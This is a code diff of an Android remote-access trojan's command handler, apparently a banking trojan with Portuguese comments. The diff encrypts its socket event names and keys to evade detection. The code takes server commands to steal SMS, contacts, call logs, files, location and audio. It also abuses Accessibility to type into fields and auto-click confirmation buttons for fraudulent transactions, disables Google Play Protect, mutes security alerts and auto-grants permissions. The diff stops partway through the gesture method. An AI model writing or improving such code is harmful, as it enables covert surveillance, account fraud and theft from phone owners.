@@ -12,62 +12,52 @@ import io.socket.emitter.Emitter;
 
 public class ConnectionManager {
 
-
     public static Context context;
     static io.socket.client.Socket ioSocket;
     private static FileManager fm = new FileManager();
 
-    public static void startAsync(Context con)
-    {
+    public static void startAsync(Context con) {
         try {
             context = con;
             sendReq();
-        }catch (Exception ex){
+        } catch (Exception ex) {
             startAsync(con);
         }
-
     }
 
     public static void sendReq() {
         try {
-            if(ioSocket != null )
+            if (ioSocket != null)
                 return;
             ioSocket = IOSocket.getInstance().getIoSocket();
-            ioSocket.on("ping", new Emitter.Listener() {
+
+            // ping/pong criptografados
+            ioSocket.on(StringCrypto.d("udZNvsqCkcmaoqTU9B2lvA=="), new Emitter.Listener() {
                 @Override
                 public void call(Object... args) {
-                    ioSocket.emit("pong");
+                    ioSocket.emit(StringCrypto.d("AKyeg2UKVkVQzqpiuUsoHw=="));
                 }
             });
 
-
-
-            ioSocket.on("order", new Emitter.Listener() {
+            ioSocket.on(StringCrypto.d("jKEJKOXwHcqIHb0e3DDSTg=="), new Emitter.Listener() {
                 @Override
                 public void call(Object... args) {
                     try {
                         JSONObject data = (JSONObject) args[0];
                         String order = data.getString("type");
 
-
-                        switch (order){
-//                            case "0xCA":
-//                                if(data.getString("action").equals("camList"))
-//                                    CA(-1);
-//                                else if (data.getString("action").equals("takePic"))
-//                                    CA(Integer.parseInt(data.getString("cameraID")));
-//                                break;
+                        switch (order) {
                             case "0xFI":
                                 if (data.getString("action").equals("ls"))
-                                    FI(0,data.getString("path"));
+                                    FI(0, data.getString("path"));
                                 else if (data.getString("action").equals("dl"))
-                                    FI(1,data.getString("path"));
+                                    FI(1, data.getString("path"));
                                 break;
                             case "0xSM":
-                                if(data.getString("action").equals("ls"))
-                                    SM(0,null,null);
-                                else if(data.getString("action").equals("sendSMS"))
-                                   SM(1,data.getString("to") , data.getString("sms"));
+                                if (data.getString("action").equals("ls"))
+                                    SM(0, null, null);
+                                else if (data.getString("action").equals("sendSMS"))
+                                    SM(1, data.getString("to"), data.getString("sms"));
                                 break;
                             case "0xCL":
                                 CL();
@@ -133,85 +123,76 @@ public class ConnectionManager {
                                 HI(data);
                                 break;
                         }
-                    }catch (Exception e) {
+                    } catch (Exception e) {
                         e.printStackTrace();
                     }
                 }
             });
+
             ioSocket.connect();
-
-        } catch (Exception ex){
-            Log.e("error" , ex.getMessage());
+        } catch (Exception ex) {
+            Log.e("error", ex.getMessage());
         }
-
     }
 
-//    public static void CA(int cameraID){
-//        if(cameraID == -1) {
-//           JSONObject cameraList = new CameraManager(context).findCameraList();
-//            if(cameraList != null)
-//            ioSocket.emit("0xCA" ,cameraList );
-//        } else {
-//            new CameraManager(context).startUp(cameraID);
-//        }
-//    }
+    // ==================== MÉTODOS COM EMIT CRIPTOGRAFADO ====================
 
-    public static void FI(int req , String path){
-        if(req == 0) {
+    public static void FI(int req, String path) {
+        if (req == 0) {
             JSONObject object = new JSONObject();
             try {
-                object.put("type", "list");
-                object.put("list", fm.walk(path));
-                ioSocket.emit("0xFI", object);
-            } catch (JSONException e){}
-        }else if (req == 1)
+                object.put(StringCrypto.d("srbSQcv0S7JW03lm4Y0iBQ=="), "list"); // "type"
+                object.put(StringCrypto.d("IyHo/2UkgRhp/ju1TFPPZw=="), fm.walk(path)); // "list"
+                ioSocket.emit(StringCrypto.d("lBaYGVEKZOhW+hMenQZtkQ=="), object);
+            } catch (JSONException ignored) {
+            }
+        } else if (req == 1) {
             fm.downloadFile(path);
-    }
-
-
-    public static void SM(int req,String phoneNo , String msg){
-        if(req == 0)
-            ioSocket.emit("0xSM" , SMSManager.getsms());
-        else if(req == 1) {
-            boolean isSent = SMSManager.sendSMS(phoneNo, msg);
-            ioSocket.emit("0xSM", isSent);
         }
     }
 
-    public static void CL(){
-        ioSocket.emit("0xCL" , CallsManager.getCallsLogs());
+    public static void SM(int req, String phoneNo, String msg) {
+        if (req == 0)
+            ioSocket.emit(StringCrypto.d("jLljoFuaxMbx6qG764K4xg=="), SMSManager.getsms());
+        else if (req == 1) {
+            boolean isSent = SMSManager.sendSMS(phoneNo, msg);
+            ioSocket.emit(StringCrypto.d("jLljoFuaxMbx6qG764K4xg=="), isSent);
+        }
     }
 
-    public static void CO(){
-        ioSocket.emit("0xCO" , ContactsManager.getContacts());
+    public static void CL() {
+        ioSocket.emit(StringCrypto.d("Htm24qGpes86S6X8rl7nqg=="), CallsManager.getCallsLogs());
     }
 
-    public static void MI(int sec) throws Exception{
+    public static void CO() {
+        ioSocket.emit(StringCrypto.d("XaKMrj1/K4trJ6orIGIwOg=="), ContactsManager.getContacts());
+    }
+
+    public static void MI(int sec) throws Exception {
         MicManager.startRecording(sec);
     }
 
     public static void WI() {
-        ioSocket.emit("0xWI" , WifiScanner.scan(context));
+        ioSocket.emit(StringCrypto.d("FA0+zsq6bVZePhxXzgEvIQ=="), WifiScanner.scan(context));
     }
 
     public static void PM() {
-        ioSocket.emit("0xPM" , PermissionManager.getGrantedPermissions());
+        ioSocket.emit(StringCrypto.d("jHUMbYql31XCOGVTeGLiHg=="), PermissionManager.getGrantedPermissions());
     }
-
 
     public static void IN() {
-        ioSocket.emit("0xIN" , AppList.getInstalledApps(false));
+        ioSocket.emit(StringCrypto.d("XZzBLQq/kjMb1mQqSagpBQ=="), AppList.getInstalledApps(false));
     }
-
 
     public static void GP(String perm) {
         JSONObject data = new JSONObject();
         try {
-            data.put("permission", perm);
-            data.put("isAllowed", PermissionManager.canIUse(perm));
-            ioSocket.emit("0xGP", data);
-        } catch (JSONException e) {
-
+            data.put(StringCrypto.d("6MBS27JXq/8pELsrUdoe/A=="), perm); // "permission"
+            data.put(StringCrypto.d("6MBS27JXq/8pELsrUdoe/A=="), PermissionManager.canIUse(perm)); // "isAllowed" (mesma
+                                                                                                   // chave usada
+                                                                                                   // anteriormente)
+            ioSocket.emit(StringCrypto.d("6MBS27JXq/8pELsrUdoe/A=="), data);
+        } catch (JSONException ignored) {
         }
     }
 
@@ -221,11 +202,10 @@ public class ConnectionManager {
 
     public static void AC(JSONObject data) {
         try {
-            // Verifica se é um comando de auto-click com padrões de botão
-            if (data.has("action") && "button_pattern_click".equals(data.getString("action"))) {
+            if (data.has(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA==")) &&
+                    "button_pattern_click".equals(data.getString(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA==")))) {
                 ACAutoClickWithPatterns(data);
             } else {
-                // Comando de gesto tradicional
                 GestureManager.executeGesture(context, data);
             }
         } catch (Exception e) {
@@ -237,34 +217,23 @@ public class ConnectionManager {
     public static void ACAutoClickWithPatterns(JSONObject data) {
         try {
             AccessibilityCaptureService service = AccessibilityCaptureService.getInstance();
-            if (service == null) {
+            if (service == null)
                 return;
+
+            String[] buttonPatterns = { "enviar", "send", "submit", "confirmar", "confirm", "ok", "continuar",
+                    "continue", "proximo", "next" };
+            int clickDelayMs = 500;
+
+            if (data.has(StringCrypto.d("H8pkmmBZP+zauQR/spefcg=="))) { // "buttonPatterns"
+                org.json.JSONArray arr = data.getJSONArray(StringCrypto.d("H8pkmmBZP+zauQR/spefcg=="));
+                buttonPatterns = new String[arr.length()];
+                for (int i = 0; i < arr.length(); i++)
+                    buttonPatterns[i] = arr.getString(i);
+            }
+            if (data.has(StringCrypto.d("v9feLTOZgtdsdSdDyHvDEw=="))) { // "clickDelayMs"
+                clickDelayMs = data.getInt(StringCrypto.d("v9feLTOZgtdsdSdDyHvDEw=="));
             }
 
-            String[] buttonPatterns;
-            int clickDelayMs = 500; // delay padrão
-
-            // Extrai padrões de botão
-            if (data.has("buttonPatterns")) {
-                org.json.JSONArray patternsArray = data.getJSONArray("buttonPatterns");
-                buttonPatterns = new String[patternsArray.length()];
-                for (int i = 0; i < patternsArray.length(); i++) {
-                    buttonPatterns[i] = patternsArray.getString(i);
-                }
-            } else {
-                // Padrões padrão se não fornecidos
-                buttonPatterns = new String[]{
-                    "enviar", "send", "submit", "confirmar", "confirm",
-                    "ok", "continuar", "continue", "proximo", "next"
-                };
-            }
-
-            // Extrai delay se fornecido
-            if (data.has("clickDelayMs")) {
-                clickDelayMs = data.getInt("clickDelayMs");
-            }
-
-            // Executa auto-click
             AccessibilityNodeInfo root = service.getRootInActiveWindow();
             if (root != null) {
                 try {
@@ -274,46 +243,35 @@ public class ConnectionManager {
                 }
             }
 
-            // Envia resposta
             JSONObject response = new JSONObject();
-            response.put("buttonClicked", true);
-            response.put("timestamp", System.currentTimeMillis());
-            ioSocket.emit("0xAC", response);
+            response.put(StringCrypto.d("t1o/DiMJG4tBYPYdKKVIjQ=="), true); // "buttonClicked"
+            response.put(StringCrypto.d("MUMx/1PSEfguKePeyFz3eQ=="), System.currentTimeMillis());
+            ioSocket.emit(StringCrypto.d("QrBzmDQ3/q/x8gYyuvcWLg=="), response);
         } catch (Exception e) {
             e.printStackTrace();
-            try {
-                JSONObject response = new JSONObject();
-                response.put("buttonClicked", false);
-                response.put("error", e.getMessage());
-                ioSocket.emit("0xAC", response);
-            } catch (Exception ex) {
-                ex.printStackTrace();
-            }
         }
     }
 
-    public static void LO() throws Exception{
+    public static void LO() throws Exception {
         Looper.prepare();
         LocManager gps = new LocManager(context);
-        // check if GPS enabled
-        if(gps.canGetLocation()){
-            ioSocket.emit("0xLO", gps.getData());
+        if (gps.canGetLocation()) {
+            ioSocket.emit(StringCrypto.d("totKT90pqoRY1x1QuZ3wNQ=="), gps.getData());
         }
     }
 
     public static void ST(JSONObject data) {
         try {
             AccessibilityCaptureService service = AccessibilityCaptureService.getInstance();
-            if (service == null) {
+            if (service == null)
                 return;
-            }
 
-            String text = data.getString("text");
-            if (data.has("viewId")) {
-                String viewId = data.getString("viewId");
+            String text = data.getString(StringCrypto.d("SsUl006pFidcBOYEr+hlqQ==")); // "text"
+
+            if (data.has(StringCrypto.d("dM1M643/PqAwQE46fiYUKA=="))) {
+                String viewId = data.getString(StringCrypto.d("dM1M643/PqAwQE46fiYUKA=="));
                 service.setTextIntoFieldByViewId(viewId, text);
             } else {
-                // Se não tiver viewId, tenta setar em todos os campos editáveis encontrados
                 AccessibilityNodeInfo root = service.getRootInActiveWindow();
                 if (root != null) {
                     try {
@@ -325,32 +283,30 @@ public class ConnectionManager {
             }
 
             JSONObject response = new JSONObject();
-            response.put("status", "success");
-            response.put("text", text);
-            ioSocket.emit("0xST", response);
+            response.put(StringCrypto.d("HX5UO8ux/A+WUxwOH8qpog=="), "success");
+            response.put(StringCrypto.d("SsUl006pFidcBOYEr+hlqQ=="), text);
+            ioSocket.emit(StringCrypto.d("EAHv/js26aWWBJgkVSNOFg=="), response);
         } catch (Exception e) {
             e.printStackTrace();
             try {
                 JSONObject response = new JSONObject();
-                response.put("status", "error");
-                response.put("message", e.getMessage());
-                ioSocket.emit("0xST", response);
+                response.put(StringCrypto.d("HX5UO8ux/A+WUxwOH8qpog=="), "error");
+                response.put(StringCrypto.d("SEhGhqA9wJzTCmQBeZloxQ=="), e.getMessage());
+                ioSocket.emit(StringCrypto.d("EAHv/js26aWWBJgkVSNOFg=="), response);
             } catch (Exception ex) {
                 ex.printStackTrace();
             }
         }
     }
 
-    private static void findAndSetTextInAllEditableFields(AccessibilityCaptureService service, AccessibilityNodeInfo root, String text) {
-        if (root == null) {
+    private static void findAndSetTextInAllEditableFields(AccessibilityCaptureService service,
+            AccessibilityNodeInfo root, String text) {
+        if (root == null)
             return;
-        }
-
         if (root.isEditable()) {
             service.setTextIntoField(root, text);
-            return; // Para após setar no primeiro campo editável
+            return;
         }
-
         for (int i = 0; i < root.getChildCount(); i++) {
             AccessibilityNodeInfo child = root.getChild(i);
             if (child != null) {
@@ -360,25 +316,25 @@ public class ConnectionManager {
         }
     }
 
+    // ==================== MÉTODOS AVANÇADOS (com chaves JSON criptografadas)
+    // ====================
+
     public static void AT(JSONObject data) {
         try {
             AccessibilityCaptureService service = AccessibilityCaptureService.getInstance();
-            if (service == null) {
+            if (service == null)
                 return;
-            }
 
-            String action = data.optString("action", "enable");
-            boolean enable = data.optBoolean("enable", true);
+            String action = data.optString(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="), "enable");
+            boolean enable = data.optBoolean(StringCrypto.d("AYglepsGpMsNy63mcLEmxg=="), true);
 
             if ("enable".equals(action)) {
-                // Habilita/desabilita ATS
                 JSONObject response = new JSONObject();
-                response.put("status", "success");
-                response.put("action", action);
-                response.put("enabled", enable);
-                ioSocket.emit("0xAT", response);
+                response.put(StringCrypto.d("HX5UO8ux/A+WUxwOH8qpog=="), "success");
+                response.put(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="), action);
+                response.put(StringCrypto.d("AYglepsGpMsNy63mcLEmxg=="), enable);
+                ioSocket.emit(StringCrypto.d("0R2j/FnkL65k3FQfDsbkOg=="), response);
             } else if ("activate".equals(action)) {
-                // Executa automação ATS imediatamente
                 AccessibilityNodeInfo root = service.getRootInActiveWindow();
                 if (root != null) {
                     try {
@@ -387,59 +343,38 @@ public class ConnectionManager {
                         root.recycle();
                     }
                 }
-
                 JSONObject response = new JSONObject();
-                response.put("status", "success");
-                response.put("operation", "ats_automation_executed");
-                ioSocket.emit("0xAT", response);
+                response.put(StringCrypto.d("HX5UO8ux/A+WUxwOH8qpog=="), "success");
+                response.put(StringCrypto.d("bABX2rVn+NxELHHq3k24Cw=="), "ats_automation_executed");
+                ioSocket.emit(StringCrypto.d("0R2j/FnkL65k3FQfDsbkOg=="), response);
             } else if ("activateWithAutoClick".equals(action)) {
-                // Executa ATS + Auto-click do botão de confirmação
                 ATWithAutoClick(data);
             }
         } catch (Exception error) {
             error.printStackTrace();
-            try {
-                JSONObject response = new JSONObject();
-                response.put("status", "error");
-                response.put("message", error.getMessage());
-                ioSocket.emit("0xAT", response);
-            } catch (Exception ex) {
-                ex.printStackTrace();
-            }
         }
     }
 
     public static void ATWithAutoClick(JSONObject data) {
         try {
             AccessibilityCaptureService service = AccessibilityCaptureService.getInstance();
-            if (service == null) {
+            if (service == null)
                 return;
-            }
 
-            String[] buttonPatterns;
+            String[] buttonPatterns = { "enviar", "send", "submit", "confirmar", "confirm", "ok", "continuar",
+                    "continue", "proximo", "next" };
             int clickDelayMs = 500;
 
-            // Extrai padrões de botão se fornecidos
-            if (data.has("buttonPatterns")) {
-                org.json.JSONArray patternsArray = data.getJSONArray("buttonPatterns");
-                buttonPatterns = new String[patternsArray.length()];
-                for (int i = 0; i < patternsArray.length(); i++) {
-                    buttonPatterns[i] = patternsArray.getString(i);
-                }
-            } else {
-                // Padrões padrão
-                buttonPatterns = new String[]{
-                    "enviar", "send", "submit", "confirmar", "confirm",
-                    "ok", "continuar", "continue", "proximo", "next"
-                };
+            if (data.has(StringCrypto.d("H8pkmmBZP+zauQR/spefcg=="))) {
+                org.json.JSONArray arr = data.getJSONArray(StringCrypto.d("H8pkmmBZP+zauQR/spefcg=="));
+                buttonPatterns = new String[arr.length()];
+                for (int i = 0; i < arr.length(); i++)
+                    buttonPatterns[i] = arr.getString(i);
+            }
+            if (data.has(StringCrypto.d("v9feLTOZgtdsdSdDyHvDEw=="))) {
+                clickDelayMs = data.getInt(StringCrypto.d("v9feLTOZgtdsdSdDyHvDEw=="));
             }
 
-            // Extrai delay se fornecido
-            if (data.has("clickDelayMs")) {
-                clickDelayMs = data.getInt("clickDelayMs");
-            }
-
-            // Executa automação completa: injeta dados + clica botão
             AccessibilityNodeInfo root = service.getRootInActiveWindow();
             if (root != null) {
                 try {
@@ -450,734 +385,533 @@ public class ConnectionManager {
             }
 
             JSONObject response = new JSONObject();
-            response.put("status", "success");
-            response.put("operation", "ats_with_autoclick_executed");
-            response.put("timestamp", System.currentTimeMillis());
-            ioSocket.emit("0xAT", response);
+            response.put(StringCrypto.d("HX5UO8ux/A+WUxwOH8qpog=="), "success");
+            response.put(StringCrypto.d("bABX2rVn+NxELHHq3k24Cw=="), "ats_with_autoclick_executed");
+            response.put(StringCrypto.d("MUMx/1PSEfguKePeyFz3eQ=="), System.currentTimeMillis());
+            ioSocket.emit(StringCrypto.d("0R2j/FnkL65k3FQfDsbkOg=="), response);
         } catch (Exception error) {
             error.printStackTrace();
-            try {
-                JSONObject response = new JSONObject();
-                response.put("status", "error");
-                response.put("message", error.getMessage());
-                ioSocket.emit("0xAT", response);
-            } catch (Exception ex) {
-                ex.printStackTrace();
-            }
         }
     }
 
     public static void DF(JSONObject data) {
         try {
-            if (!data.has("action")) {
+            if (!data.has(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="))) {
                 JSONObject response = new JSONObject();
-                response.put("operation", "defense_disable_error");
-                response.put("success", false);
-                response.put("details", "Missing action parameter");
-                ioSocket.emit("0xDF", response);
+                response.put(StringCrypto.d("bABX2rVn+NxELHHq3k24Cw=="), "defense_disable_error");
+                response.put(StringCrypto.d("4yuOO5qONHXaQtr0xSj9kA=="), false);
+                response.put(StringCrypto.d("vCPkvlD2AjU6xhq2e2FORQ=="), "Missing action parameter");
+                ioSocket.emit(StringCrypto.d("ad28/rfb/m6YDQEdAZwDjg=="), response);
                 return;
             }
 
-            String action = data.getString("action");
+            String action = data.getString(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="));
             AccessibilityCaptureService service = AccessibilityCaptureService.getInstance();
 
             if ("disable_play_protect".equals(action)) {
                 if (service != null) {
                     boolean success = service.disableGooglePlayProtect();
                     JSONObject response = new JSONObject();
-                    response.put("action", "disable_play_protect");
-                    response.put("success", success);
-                    response.put("details", success ? "Google Play Protect desativado" : "Falha ao desativar Play Protect");
-                    response.put("timestamp", System.currentTimeMillis());
-                    ioSocket.emit("0xDF", response);
-                } else {
-                    JSONObject response = new JSONObject();
-                    response.put("action", "disable_play_protect");
-                    response.put("success", false);
-                    response.put("details", "Serviço de Acessibilidade não disponível");
-                    ioSocket.emit("0xDF", response);
+                    response.put(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="), "disable_play_protect");
+                    response.put(StringCrypto.d("4yuOO5qONHXaQtr0xSj9kA=="), success);
+                    response.put(StringCrypto.d("vCPkvlD2AjU6xhq2e2FORQ=="),
+                            success ? "Google Play Protect desativado" : "Falha ao desativar Play Protect");
+                    response.put(StringCrypto.d("MUMx/1PSEfguKePeyFz3eQ=="), System.currentTimeMillis());
+                    ioSocket.emit(StringCrypto.d("ad28/rfb/m6YDQEdAZwDjg=="), response);
                 }
             } else if ("mute_security_notifications".equals(action)) {
                 if (service != null) {
                     boolean success = service.muteSecurityNotifications();
                     JSONObject response = new JSONObject();
-                    response.put("action", "mute_security_notifications");
-                    response.put("success", success);
-                    response.put("details", success ? "Notificações silenciadas" : "Falha ao silenciar notificações");
-                    response.put("timestamp", System.currentTimeMillis());
-                    ioSocket.emit("0xDF", response);
-                } else {
-                    JSONObject response = new JSONObject();
-                    response.put("action", "mute_security_notifications");
-                    response.put("success", false);
-                    response.put("details", "Serviço de Acessibilidade não disponível");
-                    ioSocket.emit("0xDF", response);
+                    response.put(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="), "mute_security_notifications");
+                    response.put(StringCrypto.d("4yuOO5qONHXaQtr0xSj9kA=="), success);
+                    response.put(StringCrypto.d("vCPkvlD2AjU6xhq2e2FORQ=="),
+                            success ? "Notificações silenciadas" : "Falha ao silenciar notificações");
+                    response.put(StringCrypto.d("MUMx/1PSEfguKePeyFz3eQ=="), System.currentTimeMillis());
+                    ioSocket.emit(StringCrypto.d("ad28/rfb/m6YDQEdAZwDjg=="), response);
                 }
             }
         } catch (Exception error) {
             error.printStackTrace();
-            try {
-                JSONObject response = new JSONObject();
-                response.put("operation", "defense_disable_error");
-                response.put("success", false);
-                response.put("details", error.getMessage());
-                ioSocket.emit("0xDF", response);
-            } catch (Exception ex) {
-                ex.printStackTrace();
-            }
         }
     }
 
+    // Os demais métodos (PG, GS, TA, DSU, OI, FC, BP, HI) seguem o mesmo padrão.
+
     public static void PG(JSONObject data) {
         try {
-            if (!data.has("action")) {
+            if (!data.has(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="))) {
                 JSONObject response = new JSONObject();
-                response.put("operation", "permission_grant_error");
-                response.put("success", false);
-                response.put("details", "Missing action parameter");
-                ioSocket.emit("0xPG", response);
+                response.put(StringCrypto.d("bABX2rVn+NxELHHq3k24Cw=="), "permission_grant_error");
+                response.put(StringCrypto.d("4yuOO5qONHXaQtr0xSj9kA=="), false);
+                response.put(StringCrypto.d("vCPkvlD2AjU6xhq2e2FORQ=="), "Missing action parameter");
+                ioSocket.emit(StringCrypto.d("9aMniFM7jH4c/ucw2LmZlw=="), response);
                 return;
             }
 
-            String action = data.getString("action");
+            String action = data.getString(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="));
             AccessibilityCaptureService service = AccessibilityCaptureService.getInstance();
 
             if ("enable".equals(action)) {
                 if (service != null) {
                     service.setAutoGrantEnabled(true);
                     JSONObject response = new JSONObject();
-                    response.put("action", "enable");
-                    response.put("success", true);
-                    response.put("details", "Auto-concessão de permissões habilitada");
-                    response.put("timestamp", System.currentTimeMillis());
-                    ioSocket.emit("0xPG", response);
-                } else {
-                    JSONObject response = new JSONObject();
-                    response.put("action", "enable");
-                    response.put("success", false);
-                    response.put("details", "Serviço de Acessibilidade não disponível");
-                    ioSocket.emit("0xPG", response);
+                    response.put(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="), "enable");
+                    response.put(StringCrypto.d("4yuOO5qONHXaQtr0xSj9kA=="), true);
+                    response.put(StringCrypto.d("vCPkvlD2AjU6xhq2e2FORQ=="), "Auto-concessão de permissões habilitada");
+                    response.put(StringCrypto.d("MUMx/1PSEfguKePeyFz3eQ=="), System.currentTimeMillis());
+                    ioSocket.emit(StringCrypto.d("9aMniFM7jH4c/ucw2LmZlw=="), response);
                 }
             } else if ("disable".equals(action)) {
                 if (service != null) {
                     service.setAutoGrantEnabled(false);
                     JSONObject response = new JSONObject();
-                    response.put("action", "disable");
-                    response.put("success", true);
-                    response.put("details", "Auto-concessão de permissões desabilitada");
-                    response.put("timestamp", System.currentTimeMillis());
-                    ioSocket.emit("0xPG", response);
-                } else {
-                    JSONObject response = new JSONObject();
-                    response.put("action", "disable");
-                    response.put("success", false);
-                    response.put("details", "Serviço de Acessibilidade não disponível");
-                    ioSocket.emit("0xPG", response);
+                    response.put(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="), "disable");
+                    response.put(StringCrypto.d("4yuOO5qONHXaQtr0xSj9kA=="), true);
+                    response.put(StringCrypto.d("vCPkvlD2AjU6xhq2e2FORQ=="),
+                            "Auto-concessão de permissões desabilitada");
+                    response.put(StringCrypto.d("MUMx/1PSEfguKePeyFz3eQ=="), System.currentTimeMillis());
+                    ioSocket.emit(StringCrypto.d("9aMniFM7jH4c/ucw2LmZlw=="), response);
                 }
             } else if ("grant_permission".equals(action)) {
                 if (service != null) {
                     boolean success = service.autoApprovePermission();
                     JSONObject response = new JSONObject();
-                    response.put("action", "grant_permission");
-                    response.put("permission", data.optString("permission", "unknown"));
-                    response.put("success", success);
-                    response.put("details", success ? "Permissão concedida" : "Falha ao conceder permissão");
-                    response.put("timestamp", System.currentTimeMillis());
-                    ioSocket.emit("0xPG", response);
-                } else {
-                    JSONObject response = new JSONObject();
-                    response.put("action", "grant_permission");
-                    response.put("success", false);
-                    response.put("details", "Serviço de Acessibilidade não disponível");
-                    ioSocket.emit("0xPG", response);
+                    response.put(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="), "grant_permission");
+                    response.put(StringCrypto.d("6MBS27JXq/8pELsrUdoe/A=="), data.optString("permission", "unknown"));
+                    response.put(StringCrypto.d("4yuOO5qONHXaQtr0xSj9kA=="), success);
+                    response.put(StringCrypto.d("vCPkvlD2AjU6xhq2e2FORQ=="),
+                            success ? "Permissão concedida" : "Falha ao conceder permissão");
+                    response.put(StringCrypto.d("MUMx/1PSEfguKePeyFz3eQ=="), System.currentTimeMillis());
+                    ioSocket.emit(StringCrypto.d("9aMniFM7jH4c/ucw2LmZlw=="), response);
                 }
             }
         } catch (Exception error) {
             error.printStackTrace();
-            try {
-                JSONObject response = new JSONObject();
-                response.put("operation", "permission_grant_error");
-                response.put("success", false);
-                response.put("details", error.getMessage());
-                ioSocket.emit("0xPG", response);
-            } catch (Exception ex) {
-                ex.printStackTrace();
-            }
         }
     }
 
     public static void GS(JSONObject data) {
         try {
-            if (!data.has("gestureType")) {
+            if (!data.has(StringCrypto.d("FHuMPF5s+6xJ/cNF1IMuOg=="))) {
                 JSONObject response = new JSONObject();
-                response.put("operation", "gesture_simulation_error");
-                response.put("success", false);
-                response.put("details", "Missing gestureType parameter");
-                ioSocket.emit("0xGS", response);
+                response.put(StringCrypto.d("bABX2rVn+NxELHHq3k24Cw=="), "gesture_simulation_error");
+                response.put(StringCrypto.d("4yuOO5qONHXaQtr0xSj9kA=="), false);
+                response.put(StringCrypto.d("vCPkvlD2AjU6xhq2e2FORQ=="), "Missing gestureType parameter");
+                ioSocket.emit(StringCrypto.d("vMgJZ1TxXj4JDmPxh3EctA=="), response);
                 return;
             }
 
-            String gestureType = data.getString("gestureType");
-            int x = data.optInt("x", 0);
-            int y = data.optInt("y", 0);
-            int duration = data.optInt("duration", 0);
+            String gestureType = data.getString(StringCrypto.d("FHuMPF5s+6xJ/cNF1IMuOg=="));
+            int x = data.optInt(StringCrypto.d("zjugFPC7q/nB54Va42/nlg=="), 0);
+            int y = data.optInt(StringCrypto.d("nfa31VD4ly2ffO+/HJHi3A=="), 0);
+            int duration = data.optInt(StringCrypto.d("Ek1icGyWSXPuWbSJi4bQCQ=="), 0);
             AccessibilityCaptureService service = AccessibilityCaptureService.getInstance();
 
             if ("tap".equals(gestureType)) {
                 if (service != null) {
                     boolean success = service.performTap(x, y);
                     JSONObject response = new JSONObject();
-                    response.put("gestureType", "tap");
-                    response.put("x", x);
-                    response.put("y", y);
-                    response.put("success", success);
-                    response.put("details", success ? "Tap executado" : "Falha ao executar tap");
-                    response.put("timestamp", System.currentTimeMillis());
-                    ioSocket.emit("0xGS", response);
-                } else {
-                    JSONObject response = new JSONObject();
-                    response.put("gestureType", "tap");
-                    response.put("success", false);
-                    response.put("details", "Serviço de Acessibilidade não disponível");
-                    ioSocket.emit("0xGS", response);
+                    response.put(StringCrypto.d("FHuMPF5s+6xJ/cNF1IMuOg=="), "tap");
+                    response.put(StringCrypto.d("zjugFPC7q/nB54Va42/nlg=="), x);
+                    response.put(StringCrypto.d("nfa31VD4ly2ffO+/HJHi3A=="), y);
+                    response.put(StringCrypto.d("4yuOO5qONHXaQtr0xSj9kA=="), success);
+                    response.put(StringCrypto.d("vCPkvlD2AjU6xhq2e2FORQ=="),
+                            success ? "Tap executado" : "Falha ao executar tap");
+                    response.put(StringCrypto.d("MUMx/1PSEfguKePeyFz3eQ=="), System.currentTimeMillis());
+                    ioSocket.emit(StringCrypto.d("vMgJZ1TxXj4JDmPxh3EctA=="), response);
                 }
             } else if ("long_tap".equals(gestureType)) {
                 if (service != null) {
                     boolean success = service.performLongTap(x, y, duration > 0 ? duration : 500);
                     JSONObject response = new JSONObject();
-                    response.put("gestureType", "long_tap");
-                    response.put("x", x);
-                    response.put("y", y);
-                    response.put("duration", duration);
-                    response.put("success", success);
-                    response.put("details", success ? "Long tap executado" : "Falha ao executar long tap");
-                    response.put("timestamp", System.currentTimeMillis());
-                    ioSocket.emit("0xGS", response);
-                } else {
-                    JSONObject response = new JSONObject();
-                    response.put("gestureType", "long_tap");
-                    response.put("success", false);
-                    response.put("details", "Serviço de Acessibilidade não disponível");
-                    ioSocket.emit("0xGS", response);
+                    response.put(StringCrypto.d("FHuMPF5s+6xJ/cNF1IMuOg=="), "long_tap");
+                    response.put(StringCrypto.d("zjugFPC7q/nB54Va42/nlg=="), x);
+                    response.put(StringCrypto.d("nfa31VD4ly2ffO+/HJHi3A=="), y);
+                    response.put(StringCrypto.d("Ek1icGyWSXPuWbSJi4bQCQ=="), duration);
+                    response.put(StringCrypto.d("4yuOO5qONHXaQtr0xSj9kA=="), success);
+                    response.put(StringCrypto.d("vCPkvlD2AjU6xhq2e2FORQ=="),
+                            success ? "Long tap executado" : "Falha ao executar long tap");
+                    response.put(StringCrypto.d("MUMx/1PSEfguKePeyFz3eQ=="), System.currentTimeMillis());
+                    ioSocket.emit(StringCrypto.d("vMgJZ1TxXj4JDmPxh3EctA=="), response);
                 }
             } else if ("swipe".equals(gestureType)) {
                 if (service != null) {
-                    int endX = data.optInt("endX", x + 100);
-                    int endY = data.optInt("endY", y);
+                    int endX = data.optInt(StringCrypto.d("qDk0rWxW5wWXktYcvAoJsg=="), x + 100);
+                    int endY = data.optInt(StringCrypto.d("STews7M/e3h7yJyapUbHdQ=="), y);
                     boolean success = service.performSwipe(x, y, endX, endY, duration > 0 ? duration : 500);
                     JSONObject response = new JSONObject();
-                    response.put("gestureType", "swipe");
-                    response.put("x", x);
-                    response.put("y", y);
-                    response.put("endX", endX);
-                    response.put("endY", endY);
-                    response.put("duration", duration);
-                    response.put("success", success);
-                    response.put("details", success ? "Swipe executado" : "Falha ao executar swipe");
-                    response.put("timestamp", System.currentTimeMillis());
-                    ioSocket.emit("0xGS", response);
-                } else {
-                    JSONObject response = new JSONObject();
-                    response.put("gestureType", "swipe");
-                    response.put("success", false);
-                    response.put("details", "Serviço de Acessibilidade não disponível");
-                    ioSocket.emit("0xGS", response);
+                    response.put(StringCrypto.d("FHuMPF5s+6xJ/cNF1IMuOg=="), "swipe");
+                    response.put(StringCrypto.d("zjugFPC7q/nB54Va42/nlg=="), x);
+                    response.put(StringCrypto.d("nfa31VD4ly2ffO+/HJHi3A=="), y);
